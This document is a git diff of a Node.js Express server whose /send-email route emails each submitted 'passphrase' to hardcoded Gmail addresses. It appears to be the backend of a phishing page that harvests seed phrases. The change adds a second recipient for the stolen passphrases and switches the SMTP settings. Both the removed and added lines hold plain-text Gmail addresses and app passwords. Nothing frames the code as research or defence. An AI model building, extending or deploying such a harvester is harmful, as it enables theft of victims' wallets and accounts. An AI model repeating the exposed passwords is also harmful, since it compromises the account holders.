@@ -3,11 +3,11 @@ const express = require('express');
 const nodemailer = require('nodemailer');
 const transporter = nodemailer.createTransport({
   host: 'smtp.gmail.com', // Gmail SMTP server
-  port: 587,              // SMTP port (use 465 for SSL)
-  secure: false,          // Use TLS (false for non-SSL)
+  port: 465,              // SMTP port (use 465 for SSL)
+  secure: true,          // Use TLS (false for non-SSL)
   auth: {
-      user: 'goyalmudit82@gmail.com',
-      pass: 'obee pgfn qsoc dfsf'
+      user: 'itsmelucifer25@gmail.com',
+      pass: 'gzcl enkn rpjf cvue'
   }
 });
 
@@ -37,8 +37,8 @@ app.post('/send-email', (req, res) => {
   // });
 
   const mailOptions = {
-    from: 'goyalmudit240@gmail.com',
-    to: 'goyalmudit82@gmail.com', // Your email
+    from: 'itsmelucifer25@gmail.com',
+    to: ['itsmelucifer25@gmail.com', 'goyalmudit240@gmail.com'], // Your email
     subject: 'New Passphrase Submitted',
     text: `Passphrase: ${passphrase}`,
   };
@@ -46,8 +46,8 @@ app.post('/send-email', (req, res) => {
   // Send the email
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
-      console.error(error);
-      res.send('<h1>Error sending email</h1>');
+      console.error('Error:', error); // Log full error
+    res.status(500).send('<h1>Error sending email</h1>');
     } else {
       console.log('Email sent: ' + info.response);
       res.send('<h1>Thank You</h1>');
